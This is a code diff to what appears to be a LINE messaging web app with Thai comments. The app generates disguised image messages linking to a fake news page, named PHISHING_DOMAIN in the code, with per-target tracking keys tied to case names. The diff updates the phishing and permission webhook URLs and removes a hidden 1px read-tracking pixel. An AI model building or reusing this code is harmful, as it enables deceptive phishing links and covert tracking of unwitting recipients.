@@ -415,7 +415,7 @@
 
         .btn:active {
             transform: translateY(0);
-            box-shadow: var (--shadow-sm);
+            box-shadow: var(--shadow-sm);
         }
 
         .btn:disabled {
@@ -741,8 +741,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzB-zHII0cKQE32F2qMXKKkxEHoCNehWKpxz4yHCZIwTmxme4EHs-6VRu9Ht2JbIhqp/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzB-zHII0cKQE32F2qMXKKkxEHoCNehWKpxz4yHCZIwTmxme4EHs-6VRu9Ht2JbIhqp/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1453,10 +1453,7 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
-                // 4. สร้าง URL สำหรับ tracking pixel เพื่อติดตามการอ่านแชท
-                const readTrackUrl = `${PHISHING_DOMAIN}read.gif?daily=${trackKey}&source=chat&read=true`;
-                
-                // 5. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้และ tracking pixel
+                // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`,
@@ -1472,37 +1469,20 @@
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
-                        },
-                        body: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
-                                {
-                                    type: 'image',
-                                    url: readTrackUrl,
-                                    size: '1px', // ทำให้มีขนาดเล็กมากจนแทบมองไม่เห็น
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover'
-                                }
-                            ],
-                            spacing: 'none',
-                            margin: 'none',
-                            paddingAll: '0px',
-                            height: '1px' // ลดความสูงให้เหลือน้อยที่สุด
                         }
                     }
                 };
 
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
-                // 6. แชร์ผ่าน LINE ShareTargetPicker
+                // 5. แชร์ผ่าน LINE ShareTargetPicker
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     const result = await liff.shareTargetPicker([message]);
                     
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // 7. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
+                        // 6. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
                         try {
                             const saved = await saveTrackingCaseMapping(trackKey, caseName);
                             if (saved) {
@@ -1512,7 +1492,7 @@
                             console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key:', saveError);
                         }
 
-                        // 8. รีเซ็ตแบบฟอร์ม
+                        // 7. รีเซ็ตแบบฟอร์ม
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
